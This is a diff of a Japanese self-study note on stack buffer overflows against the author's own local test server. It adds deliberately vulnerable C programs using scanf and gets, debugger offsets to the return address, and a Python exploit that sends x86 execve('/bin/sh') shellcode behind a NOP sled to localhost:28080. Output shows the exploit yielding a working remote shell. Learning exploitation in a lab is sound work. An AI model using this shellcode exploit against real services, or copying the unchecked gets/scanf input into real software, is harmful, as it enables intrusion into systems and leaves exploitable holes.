@@ -312,7 +312,146 @@ saru@lucifen:~/pwn003$
 ```
 
 
-## いよいよバッファオーバフローを利用してシェルを取る
+## 脆弱性のあるコード「scanf」版
+
+今回はscafを使ってみた。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void saru()
+{
+  char buf[128];
+
+  scanf("%s", buf);
+  puts(buf);
+}
+
+int main(){
+  saru();
+
+  return 0;
+}
+```
+
+objdumpで調べる
+
+- 0x08484bc: main()
+- 0x0848476: saru()
+- saru用に132バイトstack領域が取られている。
+
+gdbでメモリの場所を調べる
+
+- 0xffffd450: buf
+- 0xffffd4dc: return address
+- bufから140バイトでreturn addressに到達する
+
+https://wiki.mma.club.uec.ac.jp/ytoku/CTF/Writeup/AdventCalendarCTF2014/2014-12-17
+
+ということでscanfを使うと駄目みたい．．．
+
+## 脆弱性のあるコード「gets」版
+
+scanfを使う場合Return Oriented Programming (ROP)を書けばできるらしい。
+が、ROPはまたさらに上級なテクニックということで今回はgetsを使って↑のシェルコードで実行するのを試みた。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void saru()
+{
+  char buf[128];
+
+  gets(buf);
+  puts(buf);
+}
+
+int main(){
+  saru();
+
+  return 0;
+}
+```
+
+gdbで調べると以下の2つが分かる
+
+- 0xffffd4dc: return address
+- 0xffffd450: buf
+
+140バイトゴミを書いたら141～144バイトでreturn addressを書き換えることができる。
+
+ローカルでの動作確認はsegmentation faultやillegal instructionが出てなければ動いている場合がある。
+
+stackの詰まれ方がgdbで動かした場合と異なるのでNOP sledingで無理やりあたりを付ける。
+今回の場合にはgdbで動かしたときが0xffffd450だったのが生実行だと0xffffd490に変わった。
+つまり64バイト分スタック使用量が少なくなっている。
+
+## リモートからシェルを取る
+
+というわけでexploit code。
+
+```python
+import socket
+import time
+import telnetlib
+
+
+
+def main():
+    buf = b"\x90" * 80;
+    buf += b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"
+    buf += b'A' * (140 - 25 - 80)
+    buf += b'\xb0\xd4\xff\xff'
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect(("localhost", 28080))
+    time.sleep(1)
+    print(buf)
+    sock.sendall(buf)
+
+    print("interact mode")
+    t = telnetlib.Telnet()
+    t.sock = sock
+    t.interact()
+
+
+
+if __name__ == "__main__":
+    main()
+```
+実行結果。
+
+```
+saru@lucifen:~/pwn003$ python exploit03.py
+b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90h/sh\x00h/bin\x89\xe31\xd2RS\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0\xd4\xff\xff'
+interact mode
+
+ls
+README.md
+a.out
+exploit03.py
+exploit03_stdout.py
+hex_dump.py
+overflow03
+overflow03.c
+peda-session-dash.txt
+peda-session-overflow03.txt
+pwn_server.py
+shellcode
+shellcode.c
+test.py
+test.txt
+test_003.py
+test_execve.c
+test_execve.s
+exit
+*** Connection closed by remote host ***
+saru@lucifen:~/pwn003$
+```
 
 
 
@@ -321,5 +460,5 @@ saru@lucifen:~/pwn003$
 
 - [https://qiita.com/slowsingle/items/59c139b747edec9157cc](シェルコード書いてみた)
 - [http://inaz2.hatenablog.com/entry/2014/03/13/013056](Linux x86用のシェルコードを書いてみる)
-
-
+- [https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/](Buffer Overflow Exploit - Dhaval Kapil)
+- [https://dhavalkapil.com/blogs/Shellcode-Injection/](Shellcode Injection - Dhaval Kapil)
